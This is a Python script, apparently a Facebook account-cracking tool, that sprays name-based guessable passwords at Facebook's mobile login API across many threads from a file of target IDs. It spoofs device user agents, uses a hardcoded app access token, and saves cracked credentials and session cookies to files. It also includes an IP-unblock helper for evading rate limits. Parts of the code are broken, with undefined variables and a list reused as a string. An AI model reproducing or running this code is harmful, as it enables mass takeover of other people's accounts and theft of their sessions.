from os import path
import requests,random,uuid,string,hashlib,json,math,smtplib,platform,platform,math,smtplib,os,base64,zlib,pip,urllib,urllib3,os,base64,zlib,pip,urllib
from urllib.request import urlopen
from concurrent.futures import ThreadPoolExecutor as ThreadPoolExec
from rich.tree import Tree
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
print('\n\033[1;37m Install modules...')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
except:pass
#==============Useragent Generator===========
samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|<<LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
def ua_saim():
  fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'             # <<<<<<<<<<<<<<
  fbbv = str(random.randint(000000000,999999999))
  fbsv = str(random.randint(4,13))+'.0'
  model,build = random.choice(samsung).split('|')
  END = '[FBAN/FB4A;FBAV/'+fbav+';FBPN/com.facebook.katana;FBLC/en_GB;FBBV/'+fbbv+';FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/'+model+';FBSV/'+fbsv+';FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1280};FB_FW/1;]'
  ua = {
  "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
  "status": "ok",
  "method": "GET",
  "http_headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": "gzip",
    "accept-language": "en-US,en;q=0.9",
    "cf-connecting-ip": "223.123.110.215",
    "cf-ipcountry": "PK",
    "cf-ray": "82e388517b8004d4",
    "cf-visitor": "{\"scheme\":\"https\"}",
    "connection": "Keep-Alive",
    "cookie": "cf_clearance=c9tEbNKDuSYQsN4F7RwK4mLqedzBWTnmb.DFo67dH4c-1701351918-0-1-a3406117.987e0aad.b94903a7-0.2.1701351918",
    "host": "tools.browsernative.com",
    "priority": "u=0, i",
    "referer": "https://tools.browsernative.com/",
    "sec-ch-ua": "\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "x-forwarded-proto": "https",
    "x-real-ip": "223.123.110.215"
  }
}
#=======TIME======== 
now = datetime.now()
Today_time = now.strftime(f'%H:%M:%S')
Today_date = now.strftime('%Y/%m/%d')
#===============Login System============
def sp(stri):
    for letter in stri:
        print(letter, end = "")
        sys.stdout.flush()
        time.sleep(0.02)
P = '\x1b[1;97m'
G = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
W = '\033[97;1m' 
R = '\033[97;1m' 
G = '\033[97;1m' 
Y = '\033[97;1m' 
B = '\033[97;1m'
P = '\033[97;1m'
C = '\033[97;1m'
N = '\x1b[0m'
Z = random.choice([P,M,H,K,B,U,O,N,G,R])
        
#========logo1=======
logo1=("""\033[1;37m
   .d8888b.        d8888 8888888 888b     d888 
  d88P  Y88b      d88888   888   8888b   d8888 
  Y88b.          d88P888   888   88888b.d88888 
   "Y888b.      d88P 888   888   888Y88888P888 
      "Y88b.   d88P  888   888   888 Y888P 888 
        "888  d88P   888   888   888  Y8P  888 
  Y88b  d88P d8888888888   888   888   "   888 
   "Y8888P" d88P     888 8888888 888       888
----------------------------------------------
 \033[1;37m[\033[1;32m+\033[1;37m] OWNER     :\033[1;33m AQEEL AHMED
 \033[1;37m[\033[1;32m+\033[1;37m] GITHUB    :\033[1;33m AQEEL AHMED
 \033[1;37m[\033[1;32m+\033[1;37m] VERSION   :\033[1;33m 1.3\033[1;37m
 \033[1;37m[\033[1;32m+\033[1;37m] STATUS    :\033[1;33m FREE\033[1;37m 
--------------------------------------------""")
def lines():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
        print(logo1)
id,oks,cps,twf,tokenku,loop=[],[],[],[],[],0

def menu():
        try:
                clear()
                if 1==1:
                        clear()
                        print('\033[1;37m [A] File cloning\n [E] Exit')
                        lines()
                        xd=input(' Choose an option: ')
                        if xd in ['A','a']:
                                clear()
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100088406914968')
                                print(' Put file :  /sdcard/File.txt ')
                                lines()
                                file = input(' Put file path\033[1;37m : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        sp(' File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' [1] Method 1  \n [2] Method 2 ')
                                lines()
                                mthd=input(' Choose: ')
                                lines()
                                plist = []
                                clear()
                                print(' Select Password Crack menu');lines();print(' [1] Crack with auto password \n [2] Crack with choice password ');lines()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('first12345')
                                        plist.append('First Last')
                                        plist.append('first786')
                                        plist.append('firstlast123')
                                        plist.append('firstlast786')
                                        plist.append('first12')
                                        plist.append('first112233')
                                        plist.append('lastlast')
                                        plist.append('last12345')
                                        plist.append('last123')
                                        plist.append('57273200')
                                        plist.append('57575751')
                                        plist.append('59039200')
                                else:
                                        try:
                                                #lines()
                                                clear()
                                                ps_limit = int(input(' How many passwords do you want to add : '))
                                        except:
                                                ps_limit =1
                                        lines()
                                        print('\033[1;32m exp: first last,firtslast,first123')
                                        lines()
                                        for i in range(ps_limit):
                                                plist.append(input(f' Put password {i+1}: '))
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        print(f" [\033[1;32m+\033[1;37m] Cloning Started - " +Today_time,Today_date)
                                        lines()
                                        total_ids = str(len(fo))
                                        print(' [\033[1;32m+\033[1;37m] Total ids : \033[1;32m'+total_ids)
                                        print("\033[1;37m [\033[1;32m+\033[1;37m] USE AIRPLANE MODE FOR OK IDZ")
                                        lines()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                else:
                                                	crack_submit.submit(api,ids,names,passlist)
                                print('\033[1;37m')
                                lines()
                                print(' The process has completed')
                                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                                lines()
                                input(' Press enter to back ')
                                os.system('python AQEEL.py')
                        else:
                                exit(' Allah Hafiz')
                else:
                        print(' Run :  python AQEEL.py')
                        lines()
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()

def ffb(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Running] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-USMII"}
                        "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Successful] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SAIM-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SAIM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                
                                                print('\r\r \033[1;34m[SAIM-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print('\r\r\x1b[1;31m [ALONE-SAIM-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SAIM-CP.txt','a').write(ids+'|'+pas+'\n')
                                        break
                                        cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
def api(ids,names,passlist):
        try:
                global oks,loop,sim_id,device
                sys.stdout.write('\r\r\033[1;37m [SAIM-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()                
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';[FBAN/FB4A;FBAV/430.0.0.39.80;FBBV/611089515;FBDM/{density=1.0,width=1080,height=1080};FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/Airtel;FBMF/redmi;FBBD/redmi;FBPN/'+fbpn+';FBDV/Redmi Note 7;FBSV/4.4.1;FBOP/10;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                "sim_country": "id",
                                'try_num':'1',
                                'family_device_id':family,
                                'sim_serials':sim_serials,
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'logged_out_id': str(uuid.uuid4()),
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'tier': 'regular',
                                'reg_instance': str(uuid.uuid4()),
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'locale':fblc,
                                'client_country_code':'',
                                'fb_api_req_friendly_name':'authenticate',
                                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
                                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SAIM-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/SAIM-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                        	
                                        
                                                print('\r\r \033[1;34m[SAIM-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print('\r\r\033[1;34m [SAIM-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SAIM-CP.txt','a').write(ids+'|'+pas+'\n')
                                        break
                                        cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass

try:

   menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:
    print(e)
#####_____IP-UNBLOCK_____#####
ip_check_url = "http://ip-api.com/json/"
ip_unblock_url= 'https://updraftplus.com/unblock-ip-address/'
def ipMain():
		clear()
		print(f"{W} [{R}+{W}] {W}          UNBLOCK YOUR IP By AQEEL TOOL")
		line()
		print(f"{W} [{R}1{W}] {W}MANUAL")
		print(f"{W} [{R}2{W}] {W}AUTO")
		line()
		m = input(f"{W} [{R}+{W}] {W}SELECT: ")
		if m in ['1','01']:manual()
		else:iAmIPChecker()
def manual():
		clear()
		print(f"{W} [{R}+{W}] {W}TRY TO UNBLOCK YOUR IP BY AQEEL TOOL")
		print(f"{W} [{R}+{W}] {W}GO TO SETTING AND OPEN ABOUT PHONE ")
		print(f"{W} [{R}+{W}] {W}COPY YOUR IP FROM ABOUT AND PASTE HERE ")
		line ()
		ip = input(f"{W} [{R}+{W}] {W}PASTE YOUR IP : ")
		line()
		iAmIPUnblocker(ip)
def iAmIPChecker():
		clear()
		print(f"{W} [{R}+{W}] {W}USE FLIGHT MODE FOR 5 SECND BEFORE USE .")
		input(f"{W} [{R}+{W}] {W}PRESS ENTER TO START ...")
		line()
		print(f"{W} [{R}+{W}] {W}DETECTING YOUR IP PLEASE WAIT ...")
		try:
			getting_network_ip = requests.get(ip_check_url).json()
			ip = getting_network_ip["query"]
			print(f"{W} [{R}+{W}] {G}YOUR IP ADRESS : {ip}")
			iAmIPUnblocker(str(ip))
		except requests.exceptions.ConnectionError:
			print(f"{W} [{R}+{W}] {R}CHECK YOUR CONNECTION  ")
		except KeyError:
			print(f"{W} [{R}+{W}] {W}PLEASE CHANGE YOUR NETWORK  !! ..")
		except Exception as e:
			print(e)
def iAmIPUnblocker(x):
		print(f"{W} [{R}+{W}] {G}TRYING TO UNBLOCK YOUR IP ...")
		try:
			r2 = requests.get(ip_unblock_url).text
		except requests.exceptions.ConnectionError:
			print(f"{W} [{R}+{W}] {R}CHECK YOUR NET CONNECTION  ")
		data={}
		ud_unblock_ip = x
		nonce= re.search('name="nonce" value="(.*?)"',r2).group(1)
		data.update({'ud_unblock_ip':ud_unblock_ip,'nonce':nonce,})
		try:
			po = requests.post(ip_unblock_url,data=data).text
		except requests.exceptions.ConnectionError:
			print(f"{W} [{R}+{W}] {W}CHECK YOUR NET CONNECTION ")
		if "{W} [{R}+{W}] {W}YOUR IP UNBLOCK FAIL " in po:
			print(f"{W} [{R}+{W}] {W}TRY AGAIN LATTER... ")
			line()
		elif "{W} [{R}+{W}] {W}THIS IP RECENTLY UNBLOCKED." in po:
			exit(f"{W} [{R}+{W}] {W}THIS IP ALREADY UNBLOCKED ")
		else:
			pass
			print(f"{W} [{R}+{W}] {G}YOR IP UNBLOCK SUCCESSFULLY")
			input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK HOME ...")
			menu()
#####____END-Setup____#####   
menu()
